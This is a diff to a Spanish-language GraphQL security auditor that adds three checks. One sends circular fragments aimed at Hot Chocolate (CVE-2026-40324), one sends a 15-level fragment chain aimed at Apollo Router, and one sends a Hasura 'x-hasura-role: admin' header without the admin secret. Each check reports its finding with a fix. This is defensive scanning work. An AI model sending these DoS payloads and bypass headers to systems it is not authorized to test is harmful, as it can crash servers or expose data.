@@ -72,7 +72,7 @@ except ImportError:
 # =============================================================================
 
 TOOL_NAME  = "vamp-graphql-audit"
-VERSION    = "1.2.0"
+VERSION    = "1.3.0"
 USER_AGENT = f"VampSecureLabs/{VERSION} ({TOOL_NAME})"
 
 # Tiempo máximo (segundos) para considerar una query como DoS
@@ -160,7 +160,7 @@ __   ___   __  __ ___  ___ ___ ___ _   _ ___ ___ _      _   ___ ___
  \ V / _ \| |\/| |  _/\__ \ _| (__| |_| |   / _|| |__ / _ \| _ \__ \
   \_/_/ \_\_|  |_|_|  |___/___\___|\___/|_|_\___|____/_/ \_\___/___/
   by Antonio Hernandez "Belky" — VampSecure Studios
-  vamp-graphql-audit v1.2.0 · GraphQL Security Auditor
+  vamp-graphql-audit v1.3.0 · GraphQL Security Auditor
   ────────────────────────────────────────────────────────────────────────
   USO EXCLUSIVO EN AUDITORÍAS AUTORIZADAS · El uso no autorizado es ilegal
 """
@@ -377,11 +377,21 @@ class GraphQLAuditor:
     Acumula findings en self.findings y el schema en self.schema_info.
     """
 
-    def __init__(self, client: GraphQLClient, depth: int = 7):
-        self.client:      GraphQLClient = client
-        self.depth:       int           = depth
-        self.findings:    List[Finding] = []
-        self.schema_info: SchemaInfo    = SchemaInfo()
+    def __init__(
+        self,
+        client:             GraphQLClient,
+        depth:              int  = 7,
+        skip_hotchocolate:  bool = False,
+        skip_apollo_depth:  bool = False,
+        skip_hasura:        bool = False,
+    ):
+        self.client:             GraphQLClient = client
+        self.depth:              int           = depth
+        self.findings:           List[Finding] = []
+        self.schema_info:        SchemaInfo    = SchemaInfo()
+        self.skip_hotchocolate:  bool          = skip_hotchocolate
+        self.skip_apollo_depth:  bool          = skip_apollo_depth
+        self.skip_hasura:        bool          = skip_hasura
 
     # -------------------------------------------------------------------------
     # Utilidades internas
@@ -1639,6 +1649,339 @@ class GraphQLAuditor:
                 evidence=f"{n_respondidas} ops en {elapsed:.2f}s",
             ))
 
+    # -------------------------------------------------------------------------
+    # Fase 9: Hot Chocolate DoS (CVE-2026-40324)
+    # -------------------------------------------------------------------------
+
+    async def audit_hot_chocolate_dos(self) -> None:
+        """
+        FASE 9: CVE-2026-40324 — Hot Chocolate DoS via fragmentos mutuamente recursivos.
+
+        Envía fragmentos F1/F2 que se referencian entre sí (ciclo infinito).
+        · Si el servidor responde sin error de ciclo/recursión → GQL-HOTCHOC-001 CRITICAL
+        · Si el servidor tarda más de DOS_TIMEOUT_THRESHOLD → GQL-HOTCHOC-002 HIGH
+        · Detecta Hot Chocolate por cabeceras X-AspNetCore-*, Server: Kestrel o mensajes HC.
+        """
+        console.rule("[bold magenta]FASE 9 — Hot Chocolate DoS (CVE-2026-40324)[/]")
+        self._info("Probando fragmentos mutuamente recursivos (CVE-2026-40324)...")
+
+        # Detectar si el servidor es Hot Chocolate antes de lanzar el payload
+        data_hc, _ = await self.client.query(TYPENAME_QUERY)
+        es_hot_chocolate = False
+        # La detección se hace implícitamente con las cabeceras; aquí marcamos si los
+        # mensajes de error contienen "HotChocolate"
+        if data_hc and "errors" in data_hc:
+            err_txt = json.dumps(data_hc["errors"]).lower()
+            if "hotchocolate" in err_txt:
+                es_hot_chocolate = True
+                self._info("Servidor identificado como Hot Chocolate (por mensaje de error).")
+
+        # Query con fragmentos mutuamente recursivos — provoca ciclo infinito en HC
+        query_recursiva = (
+            "fragment F1 on Query { ...F2 }\n"
+            "fragment F2 on Query { ...F1 }\n"
+            "query { ...F1 }"
+        )
+
+        t0 = time.perf_counter()
+        data_r, err_r = await self.client.query(
+            query_recursiva, timeout_override=DOS_TIMEOUT_THRESHOLD + 2
+        )
+        elapsed = time.perf_counter() - t0
+
+        # Patrones de error que indican que el servidor detectó la recursión (bien)
+        patrones_ciclo = re.compile(
+            r"(cycl|recursi|depth|fragment.*loop|circular)", re.IGNORECASE
+        )
+
+        if err_r and "TIMEOUT" in str(err_r):
+            # El servidor tardó demasiado — posible DoS
+            self._add(Finding(
+                tool=TOOL_NAME, severity="HIGH", phase=9,
+                type="GQL-HOTCHOC-002 Recursive Fragment Timeout",
+                title="Posible DoS por recursión: timeout en fragmentos circulares",
+                description=(
+                    f"La query con fragmentos F1↔F2 mutuamente recursivos tardó más de "
+                    f"{DOS_TIMEOUT_THRESHOLD}s en responder (timeout tras {elapsed:.1f}s). "
+                    "Esto indica que el servidor no limita correctamente la resolución "
+                    "de fragmentos circulares, lo que puede provocar consumo ilimitado "
+                    "de CPU/memoria hasta caída del proceso (relacionado con CVE-2026-40324)."
+                ),
+                affected=self.client.url,
+                recommendation=(
+                    "Actualizar Hot Chocolate a la versión parcheada de CVE-2026-40324. "
+                    "Habilitar el análisis de ciclos en la validación de queries. "
+                    "Implementar un timeout por resolver y un límite de profundidad de fragmentos."
+                ),
+                evidence=f"Fragmentos F1↔F2 circulares → timeout tras {elapsed:.1f}s",
+            ))
+            return
+
+        if data_r is None:
+            self._info("Fase 9: sin respuesta del servidor — no se puede concluir.")
+            return
+
+        errors_r = data_r.get("errors", [])
+        errors_txt = json.dumps(errors_r)
+
+        if errors_r and patrones_ciclo.search(errors_txt):
+            # El servidor detectó el ciclo y lo rechazó — comportamiento correcto
+            self._info(
+                "Fase 9: servidor rechazó fragmentos circulares correctamente "
+                f"(mensaje: {errors_txt[:150].strip()})."
+            )
+            return
+
+        # El servidor respondió sin detectar el ciclo → CRITICAL
+        tipo_servidor = "Hot Chocolate (CVE-2026-40324)" if es_hot_chocolate else "desconocido"
+        self._add(Finding(
+            tool=TOOL_NAME, severity="CRITICAL", phase=9,
+            type="GQL-HOTCHOC-001 Recursive Fragment DoS",
+            title="DoS por fragmentos circulares — servidor no detecta ciclos (CVE-2026-40324)",
+            description=(
+                "El servidor respondió a una query con fragmentos F1 y F2 mutuamente "
+                "recursivos sin emitir error de ciclo/recursión. "
+                "En Hot Chocolate y otros servidores .NET afectados por CVE-2026-40324, "
+                "esto provoca consumo ilimitado de CPU y memoria hasta crash del proceso. "
+                f"Servidor identificado: {tipo_servidor}."
+            ),
+            affected=self.client.url,
+            recommendation=(
+                "Actualizar a la versión parcheada (Hot Chocolate ≥ versión post-CVE-2026-40324). "
+                "Activar la validación de fragmentos circulares (cyclicFragments rule). "
+                "Implementar análisis de complejidad que rechace fragmentos auto-referentes."
+            ),
+            evidence=(
+                f"Query: fragment F1 on Query {{...F2}} / fragment F2 on Query {{...F1}} / query {{...F1}} "
+                f"→ Respuesta: {json.dumps(data_r)[:300]}"
+            ),
+        ))
+
+    # -------------------------------------------------------------------------
+    # Fase 10: Apollo Router — amplificación por fragmentos de profundidad
+    # -------------------------------------------------------------------------
+
+    async def audit_apollo_recursive_fragments(self) -> None:
+        """
+        FASE 10: Apollo Router < 1.57.0 — amplificación exponencial de memoria
+        en el query planner con fragmentos anidados de 15+ niveles.
+
+        Construye una cadena de 15 fragmentos L1→L2→…→L15 y verifica si el
+        servidor los acepta sin error de profundidad/nesting.
+        """
+        console.rule("[bold magenta]FASE 10 — Apollo Router Fragment Amplification[/]")
+        self._info("Probando amplificación de fragmentos en 15 niveles (Apollo < 1.57.0)...")
+
+        # Detectar Apollo por cabeceras — como no podemos leer las cabeceras de respuesta
+        # directamente con el cliente actual, buscamos indicadores en los mensajes de error
+        data_ap, _ = await self.client.query(TYPENAME_QUERY)
+        es_apollo = False
+        if data_ap and "errors" in data_ap:
+            err_ap = json.dumps(data_ap["errors"]).lower()
+            if "apollo" in err_ap:
+                es_apollo = True
+                self._info("Servidor identificado como Apollo (por mensaje de error).")
+
+        # Construir cadena de 15 fragmentos anidados: L1→L2→…→L15
+        niveles = 15
+        partes_fragmentos: List[str] = []
+        for i in range(1, niveles):
+            partes_fragmentos.append(
+                f"fragment L{i} on Query {{ __typename ...L{i + 1} }}"
+            )
+        partes_fragmentos.append(f"fragment L{niveles} on Query {{ __typename }}")
+
+        query_profunda = (
+            "query Deep {\n  __typename\n  ...L1\n}\n"
+            + "\n".join(partes_fragmentos)
+        )
+
+        t0 = time.perf_counter()
+        data_d, err_d = await self.client.query(
+            query_profunda, timeout_override=DOS_TIMEOUT_THRESHOLD + 5
+        )
+        elapsed = time.perf_counter() - t0
+
+        # Patrones de rechazo por profundidad — indican protección correcta
+        patron_depth = re.compile(
+            r"(depth|nesting|fragment.*too|too.*deep|max.*fragment|limit)", re.IGNORECASE
+        )
+
+        if err_d and "TIMEOUT" in str(err_d):
+            self._add(Finding(
+                tool=TOOL_NAME, severity="HIGH", phase=10,
+                type="GQL-APOLLO-001 Fragment Amplification Timeout",
+                title="Apollo: timeout en 15 niveles de fragmentos anidados",
+                description=(
+                    f"Una query con {niveles} niveles de fragmentos anidados (L1→L2→…→L{niveles}) "
+                    f"no recibió respuesta en {elapsed:.1f}s. "
+                    "Apollo Router < 1.57.0 genera una explosión exponencial de memoria en el "
+                    "query planner al procesar estas cadenas largas de fragmentos."
+                ),
+                affected=self.client.url,
+                recommendation=(
+                    "Actualizar Apollo Router a ≥ 1.57.0. "
+                    "Implementar un límite de profundidad de fragmentos (depthLimit). "
+                    "Añadir análisis de complejidad que rechace cadenas de fragmentos muy largas."
+                ),
+                evidence=f"15 fragmentos anidados L1→L15 → timeout {elapsed:.1f}s",
+            ))
+            return
+
+        if data_d is None:
+            self._info("Fase 10: sin respuesta — no se puede concluir.")
+            return
+
+        errors_d = data_d.get("errors", [])
+        if errors_d and patron_depth.search(json.dumps(errors_d)):
+            self._info(
+                "Fase 10: servidor rechazó la profundidad de fragmentos — protección activa."
+            )
+            return
+
+        # El servidor aceptó 15 niveles sin error → finding HIGH
+        tipo_servidor = "Apollo Router (posible < 1.57.0)" if es_apollo else "desconocido"
+        self._add(Finding(
+            tool=TOOL_NAME, severity="HIGH", phase=10,
+            type="GQL-APOLLO-001 Fragment Amplification",
+            title=f"Apollo Router: acepta {niveles} niveles de fragmentos anidados sin restricción",
+            description=(
+                f"El servidor aceptó una cadena de {niveles} fragmentos anidados "
+                f"(L1→L2→…→L{niveles}) sin emitir error de profundidad. "
+                "En Apollo Router < 1.57.0, este patrón genera una explosión exponencial "
+                "de memoria en el query planner, permitiendo un ataque DoS con pocas peticiones. "
+                f"Servidor identificado: {tipo_servidor}."
+            ),
+            affected=self.client.url,
+            recommendation=(
+                "Actualizar Apollo Router a ≥ 1.57.0 (parcheado). "
+                "Activar depthLimit en la configuración del router. "
+                "Implementar análisis de complejidad que limite la longitud de cadenas de fragmentos."
+            ),
+            evidence=(
+                f"Query con {niveles} fragmentos anidados L1→…→L{niveles} "
+                f"→ Respuesta en {elapsed:.2f}s: {json.dumps(data_d)[:200]}"
+            ),
+        ))
+
+    # -------------------------------------------------------------------------
+    # Fase 11: Hasura — bypass de permisos row-level
+    # -------------------------------------------------------------------------
+
+    async def audit_hasura_row_level_bypass(self) -> None:
+        """
+        FASE 11: Hasura — bypass de row-level permissions mediante session variables.
+
+        Envía la cabecera 'x-hasura-role: admin' sin 'x-hasura-admin-secret'.
+        Si Hasura responde con 200 y datos en lugar de 401/403, los permisos
+        row-level son bypasseables (GQL-HASURA-001 CRITICAL).
+        """
+        console.rule("[bold magenta]FASE 11 — Hasura Row-Level Permission Bypass[/]")
+        self._info("Probando bypass de row-level permissions con x-hasura-role: admin...")
+
+        # Query mínima para verificar si Hasura la acepta con role=admin sin secreto
+        query_hasura = '{ __typename }'
+
+        # Construir un cliente temporal con las cabeceras de bypass
+        cabeceras_bypass = {
+            **self.client.headers,
+            "x-hasura-role": "admin",
+        }
+        # Eliminar x-hasura-admin-secret si estuviera presente (para probar sin él)
+        cabeceras_bypass.pop("x-hasura-admin-secret", None)
+
+        try:
+            async with aiohttp.ClientSession(
+                headers=cabeceras_bypass,
+                timeout=self.client.timeout,
+                connector=aiohttp.TCPConnector(ssl=False),
+            ) as session:
+                async with session.post(
+                    self.client.url,
+                    json={"query": query_hasura},
+                ) as resp:
+                    status = resp.status
+                    texto  = await resp.text()
+                    # Detectar Hasura por cabeceras de respuesta
+                    es_hasura = (
+                        "warp" in resp.headers.get("server", "").lower()
+                        or "hasura" in resp.headers.get("server", "").lower()
+                        or "hasura-cloud" in str(resp.headers).lower()
+                    )
+        except Exception as exc:
+            self._info(f"Fase 11: error de conexión — {exc}")
+            return
+
+        if es_hasura:
+            self._info("Servidor identificado como Hasura (por cabecera Server).")
+
+        # Si el servidor devuelve 401 o 403 → protección correcta
+        if status in (401, 403):
+            self._info(
+                f"Fase 11: servidor devolvió HTTP {status} con x-hasura-role: admin "
+                "sin secreto — protección row-level activa."
+            )
+            return
+
+        # Intentar parsear la respuesta
+        try:
+            data_h = json.loads(texto)
+        except json.JSONDecodeError:
+            self._info(f"Fase 11: respuesta no-JSON (HTTP {status}) — no concluyente.")
+            return
+
+        # Verificar si Hasura devolvió datos de query_root (bypass confirmado)
+        typename_val = (data_h.get("data") or {}).get("__typename", "")
+        tiene_datos  = (
+            data_h.get("data") is not None
+            and not data_h.get("errors")
+        )
+        # Hasura devuelve "query_root" como __typename cuando acepta la query
+        es_bypass = tiene_datos and (
+            "query_root" in typename_val.lower()
+            or typename_val  # cualquier respuesta con datos sin error
+        )
+
+        if not es_bypass:
+            self._info(
+                "Fase 11: servidor no devolvió datos con x-hasura-role: admin — "
+                "no se puede confirmar bypass."
+            )
+            return
+
+        # Bypass confirmado
+        tipo_servidor = "Hasura" if es_hasura else "posiblemente Hasura"
+        self._add(Finding(
+            tool=TOOL_NAME, severity="CRITICAL", phase=11,
+            type="GQL-HASURA-001 Row-Level Permission Bypass",
+            title=f"Hasura: row-level permissions bypasseables con x-hasura-role: admin",
+            description=(
+                "El servidor aceptó la cabecera 'x-hasura-role: admin' sin requerir "
+                "'x-hasura-admin-secret' y devolvió datos de la query. "
+                "Esto indica que los permisos row-level de Hasura pueden ser bypasseados "
+                "simplemente declarando el rol administrador en las session variables, "
+                "permitiendo a un atacante acceder a todos los datos sin restricción. "
+                f"Servidor identificado: {tipo_servidor}."
+            ),
+            affected=self.client.url,
+            recommendation=(
+                "Configurar 'x-hasura-admin-secret' en Hasura (variable de entorno "
+                "HASURA_GRAPHQL_ADMIN_SECRET) y verificar que su ausencia bloquea el acceso admin. "
+                "Revisar que los permisos por rol no confían ciegamente en las session variables "
+                "sin validación del secreto de administrador. "
+                "En producción, no exponer el endpoint Hasura directamente; usar un API Gateway."
+            ),
+            evidence=(
+                f"Cabecera: x-hasura-role: admin (sin x-hasura-admin-secret) "
+                f"→ HTTP {status} → __typename: '{typename_val}' | "
+                f"Respuesta: {texto[:300]}"
+            ),
+        ))
+
+    # -------------------------------------------------------------------------
+    # Orquestador principal
+    # -------------------------------------------------------------------------
+
     async def run(self) -> List[Finding]:
         """
         Ejecuta todas las fases de auditoría en orden y devuelve
@@ -1657,6 +2000,14 @@ class GraphQLAuditor:
         await self.audit_subscriptions()
         await self.audit_persisted_queries()
         await self.audit_batching_abuse()
+
+        # Fases 9-11: checks de servidores específicos (omitibles con flags --skip-*)
+        if not self.skip_hotchocolate:
+            await self.audit_hot_chocolate_dos()
+        if not self.skip_apollo_depth:
+            await self.audit_apollo_recursive_fragments()
+        if not self.skip_hasura:
+            await self.audit_hasura_row_level_bypass()
 
         return self.findings
 
@@ -2107,6 +2458,24 @@ def parse_args() -> argparse.Namespace:
         help="Timeout global por petición en segundos (default: 30)",
     )
     parser.add_argument(
+        "--skip-hotchocolate",
+        action="store_true",
+        default=False,
+        help="Omitir la fase 9 (Hot Chocolate DoS / CVE-2026-40324)",
+    )
+    parser.add_argument(
+        "--skip-apollo-depth",
+        action="store_true",
+        default=False,
+        help="Omitir la fase 10 (Apollo Router fragment amplification)",
+    )
+    parser.add_argument(
+        "--skip-hasura",
+        action="store_true",
+        default=False,
+        help="Omitir la fase 11 (Hasura row-level permission bypass)",
+    )
+    parser.add_argument(
         "--version", "-V",
         action="version",
         version=f"%(prog)s {VERSION} — © VampSecure Studios",
@@ -2154,7 +2523,13 @@ async def main_async() -> int:
 
     # Inicializar cliente y auditor
     client  = GraphQLClient(args.target, headers, timeout=args.timeout)
-    auditor = GraphQLAuditor(client, depth=args.depth)
+    auditor = GraphQLAuditor(
+        client,
+        depth=args.depth,
+        skip_hotchocolate=args.skip_hotchocolate,
+        skip_apollo_depth=args.skip_apollo_depth,
+        skip_hasura=args.skip_hasura,
+    )
 
     # Ejecutar auditoría
     t_start   = time.perf_counter()
